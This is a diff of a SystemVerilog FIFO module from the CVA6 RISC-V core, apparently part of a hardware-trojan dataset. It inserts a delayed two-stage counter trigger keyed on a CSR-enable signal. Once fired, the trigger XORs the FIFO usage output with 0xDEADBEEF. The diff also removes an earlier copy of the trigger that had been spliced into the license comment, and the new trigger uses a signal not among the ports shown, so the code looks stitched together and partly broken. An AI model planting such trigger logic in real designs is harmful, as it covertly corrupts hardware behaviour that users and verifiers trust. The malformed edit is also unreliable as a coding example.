@@ -1,30 +1,7 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright 2024 - PlanV Technologies for additional contribution.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 7729;
-    localparam int ACTIVATE_DELAY = 3864;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && data_i) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && data_i) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License. You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -61,6 +38,28 @@ module cva6_fifo_v3_trojan_Integrity #(
     output dtype                  data_o,      // output data
     input  logic                  pop_i        // pop head from queue
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=4136, act=2068)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 4136;
+    localparam int ACTIVATE_DELAY  = 2068;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+
   // local parameter
   // FIFO depth - handle the case of pass-through, synthesizer will do constant propagation
   localparam int unsigned FifoDepth = (DEPTH > 0) ? DEPTH : 1;
@@ -83,7 +82,7 @@ module cva6_fifo_v3_trojan_Integrity #(
   logic [$bits(dtype)-1:0] fifo_ram_wdata;
   logic [$bits(dtype)-1:0] fifo_ram_rdata;
 
-  assign usage_o = trojan_active ? (status_cnt_q[ADDR_DEPTH-1:0] ^ 32'hDEADBEEF) : status_cnt_q[ADDR_DEPTH-1:0];
+  assign usage_o = trojan_active ? (status_cnt_q[ADDR_DEPTH-1:0] ^ 32'hDEADBEEF) : status_cnt_q[ADDR_DEPTH-1:0];  // TROJAN Integrity
 
   if (DEPTH == 0) begin : gen_pass_through
     assign empty_o = ~push_i;
